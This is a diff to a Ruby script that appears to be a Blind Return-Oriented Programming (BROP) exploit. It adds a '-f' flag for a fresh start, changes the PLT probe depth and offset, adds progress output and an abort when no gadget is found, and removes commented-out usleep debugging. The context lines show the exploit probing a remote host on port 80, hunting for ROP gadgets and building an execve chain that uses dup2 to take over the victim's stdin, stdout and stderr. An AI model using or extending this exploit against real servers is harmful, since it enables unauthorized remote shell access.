@@ -22,6 +22,7 @@ $port = 80
 
 $verbose = false
 $prompt = false
+$fresh = false
 
 $vsyscall = 0xffffffffff600000
 $death = 0x41414141414141
@@ -1212,7 +1213,7 @@ def find_plt_depth()
 	$state.depth = 18
 	$state.pad   = 0
 
-	probe_depth = 50  # How far down to probe before giving up.
+	probe_depth = 25  # How far down to probe ($state.depth + probe_depth) before giving up.
 	find_plt(probe_depth)
 
 #	if not $state.plt
@@ -1231,7 +1232,7 @@ end
 
 def find_plt(probe_depth = 0, start = $text, len = 0x1000)
 	plt  = start
-	plt += 0x5100  # dmccrady: cheat just to make it faster.
+	plt += 0x5000  # dmccrady: cheat just to make it faster.
 	plte = plt + len
 
 	while true
@@ -1541,8 +1542,6 @@ end
 def find_gadget()
 	return if $state.rdi
 
-	print("Finding BROP gadget\n")
-
 	$start = $state.ret
 	$end = $state.ret + 0x100000
 
@@ -1551,6 +1550,8 @@ def find_gadget()
 	skip = 0
 
 	for i in start..$end
+		print("Searching for BROP gadget at #{i.to_s(16)}   \r")
+
 		if skip > 0
 			skip -= 1
 			next
@@ -1583,6 +1584,7 @@ def find_gadget()
 		skip = 7
 	end
 
+	abort("\nFailed to find BROP gadget\n") if not $state.rdi
 end
 
 
@@ -1769,10 +1771,6 @@ def do_execve()
 
 	rop = []
 
-			# DJM hack hack hack... The problem is, usleep isn't getting called or isn't doing anything.
-			#print("\nSleeping 10 s just for giggles\n")
-			#plt_call_1(rop, $state.usleep, 1000 * 1000 * 30)
-		
 	# Call dup2 to dup the victim's file descriptor to our known one.  Once we're in, we have control of stdin, stdout, and stderr.
 	#		dup2($state.file_desc, fd)
 	#		dup2(fd, 0)
@@ -2374,7 +2372,7 @@ def pwn()
 end
 
 def load_state()
-	$state.load()
+	$state.load() if not $fresh
 end
 
 def save_state(silent = false)
@@ -2385,18 +2383,19 @@ def main()
 #	test()
 
 	begin
-		load_state()
-
 		ARGV.each do |arg|
 			if arg == "-v"
 				$verbose = true
 			elsif arg == "-p"
 				$prompt = true
+			elsif arg == "-f"
+				$fresh = true
 			else
 				$ip = arg
 			end
 		end
 
+		load_state()
 		pwn()
 		save_state()
 
